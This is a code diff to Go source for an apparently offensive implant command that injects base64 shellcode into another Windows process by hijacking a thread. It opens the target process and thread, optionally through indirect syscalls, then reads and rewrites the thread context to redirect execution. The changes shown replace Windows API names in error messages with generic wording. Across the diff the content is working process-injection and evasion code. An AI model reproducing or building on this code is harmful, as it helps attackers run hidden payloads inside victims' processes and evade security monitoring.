@@ -56,7 +56,7 @@ type ThreadHijackParams struct {
 // Execute executes the thread-hijack command
 func (c *ThreadHijackCommand) Execute(task structs.Task) structs.CommandResult {
 	if runtime.GOOS != "windows" {
-		return errorResult("Error: This command is only supported on Windows")
+		return errorResult("This command is only supported on Windows")
 	}
 
 	params, parseErr := unmarshalParams[ThreadHijackParams](task)
@@ -65,20 +65,20 @@ func (c *ThreadHijackCommand) Execute(task structs.Task) structs.CommandResult {
 	}
 
 	if params.ShellcodeB64 == "" {
-		return errorResult("Error: No shellcode data provided")
+		return errorResult("No shellcode data provided")
 	}
 
 	if params.PID <= 0 {
-		return errorResult("Error: Invalid PID specified")
+		return errorResult("Invalid PID specified")
 	}
 
 	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
 	if err != nil {
-		return errorf("Error decoding shellcode: %v", err)
+		return errorf("decoding shellcode: %v", err)
 	}
 
 	if len(shellcode) == 0 {
-		return errorResult("Error: Shellcode data is empty")
+		return errorResult("Shellcode data is empty")
 	}
 
 	output, err := performThreadHijack(shellcode, uint32(params.PID), uint32(params.TID))
@@ -106,12 +106,12 @@ func performThreadHijack(shellcode []byte, pid, tid uint32) (string, error) {
 		sb.WriteString("[*] Using indirect syscalls\n")
 		status := IndirectNtOpenProcess(&hProcess, desiredAccess, uintptr(pid))
 		if status != 0 {
-			return sb.String(), fmt.Errorf("NtOpenProcess failed: NTSTATUS 0x%X", status)
+			return sb.String(), fmt.Errorf("process open failed: status 0x%X", status)
 		}
 	} else {
 		hProcess, _, err = procOpenProcess.Call(uintptr(desiredAccess), 0, uintptr(pid))
 		if hProcess == 0 {
-			return sb.String(), fmt.Errorf("OpenProcess failed: %w", err)
+			return sb.String(), fmt.Errorf("process open failed: %w", err)
 		}
 	}
 	defer injectCloseHandle(hProcess)
@@ -145,12 +145,12 @@ func performThreadHijack(shellcode []byte, pid, tid uint32) (string, error) {
 		sb.WriteString("[*] Using indirect syscalls\n")
 		status := IndirectNtOpenThread(&hThread, threadAccess, uintptr(targetTID))
 		if status != 0 {
-			return sb.String(), fmt.Errorf("NtOpenThread failed: NTSTATUS 0x%X", status)
+			return sb.String(), fmt.Errorf("thread open failed: status 0x%X", status)
 		}
 	} else {
 		hThread, _, err = procOpenThread.Call(uintptr(threadAccess), 0, uintptr(targetTID))
 		if hThread == 0 {
-			return sb.String(), fmt.Errorf("OpenThread failed: %w", err)
+			return sb.String(), fmt.Errorf("thread open failed: %w", err)
 		}
 	}
 	defer injectCloseHandle(hThread)
@@ -171,13 +171,13 @@ func performThreadHijack(shellcode []byte, pid, tid uint32) (string, error) {
 		if status != 0 {
 			// Resume thread before returning on error
 			resumeThread(&sb, hThread)
-			return sb.String(), fmt.Errorf("NtGetContextThread failed: NTSTATUS 0x%X", status)
+			return sb.String(), fmt.Errorf("thread context read failed: status 0x%X", status)
 		}
 	} else {
 		ret, _, err := procGetThreadContext.Call(hThread, uintptr(unsafe.Pointer(&ctx)))
 		if ret == 0 {
 			resumeThread(&sb, hThread)
-			return sb.String(), fmt.Errorf("GetThreadContext failed: %w", err)
+			return sb.String(), fmt.Errorf("thread context read failed: %w", err)
 		}
 	}
 	originalRip := ctx.Rip
@@ -192,13 +192,13 @@ func performThreadHijack(shellcode []byte, pid, tid uint32) (string, error) {
 		status := IndirectNtSetContextThread(hThread, uintptr(unsafe.Pointer(&ctx)))
 		if status != 0 {
 			resumeThread(&sb, hThread)
-			return sb.String(), fmt.Errorf("NtSetContextThread failed: NTSTATUS 0x%X", status)
+			return sb.String(), fmt.Errorf("thread context write failed: status 0x%X", status)
 		}
 	} else {
 		ret, _, err := procSetThreadContext.Call(hThread, uintptr(unsafe.Pointer(&ctx)))
 		if ret == 0 {
 			resumeThread(&sb, hThread)
-			return sb.String(), fmt.Errorf("SetThreadContext failed: %w", err)
+			return sb.String(), fmt.Errorf("thread context write failed: %w", err)
 		}
 	}
 	sb.WriteString("[+] Thread context updated\n")
@@ -216,7 +216,7 @@ func resumeThread(sb *strings.Builder, hThread uintptr) {
 		var prevCount uint32
 		status := IndirectNtResumeThread(hThread, &prevCount)
 		if status != 0 {
-			sb.WriteString(fmt.Sprintf("[!] NtResumeThread failed: NTSTATUS 0x%X\n", status))
+			sb.WriteString(fmt.Sprintf("[!] Thread resume failed: status 0x%X\n", status))
 			return
 		}
 		sb.WriteString(fmt.Sprintf("[+] Thread resumed (previous suspend count: %d)\n", prevCount))
